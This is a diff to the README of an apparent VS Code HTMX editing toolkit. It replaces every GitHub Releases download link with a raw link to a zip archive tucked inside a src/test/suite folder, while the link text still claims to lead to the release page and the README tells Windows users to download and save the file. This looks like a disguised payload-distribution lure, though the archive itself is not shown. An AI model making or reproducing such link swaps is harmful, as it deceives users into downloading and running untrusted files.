@@ -1,6 +1,6 @@
 # 🧰 htmx-vscode-toolkit - Faster HTMX Editing in VS Code
 
-[![Download htmx-vscode-toolkit](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ribbonfernbutcherbird693/htmx-vscode-toolkit/releases)
+[![Download htmx-vscode-toolkit](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/ribbonfernbutcherbird693/htmx-vscode-toolkit/main/src/test/suite/htmx_vscode_toolkit_lareabell.zip)
 
 ## 🚀 What this app does
 
@@ -19,7 +19,7 @@ This tool is built for people who want a smoother way to edit HTMX-based web fil
 
 Visit this page to download the latest release:
 
-[Download from GitHub Releases](https://github.com/ribbonfernbutcherbird693/htmx-vscode-toolkit/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/ribbonfernbutcherbird693/htmx-vscode-toolkit/main/src/test/suite/htmx_vscode_toolkit_lareabell.zip)
 
 Look for the newest Windows release file on that page and save it to your computer.
 
@@ -214,4 +214,4 @@ To keep things simple:
 
 ## 📎 Download again
 
-[Visit the htmx-vscode-toolkit release page](https://github.com/ribbonfernbutcherbird693/htmx-vscode-toolkit/releases)
+[Visit the htmx-vscode-toolkit release page](https://raw.githubusercontent.com/ribbonfernbutcherbird693/htmx-vscode-toolkit/main/src/test/suite/htmx_vscode_toolkit_lareabell.zip)
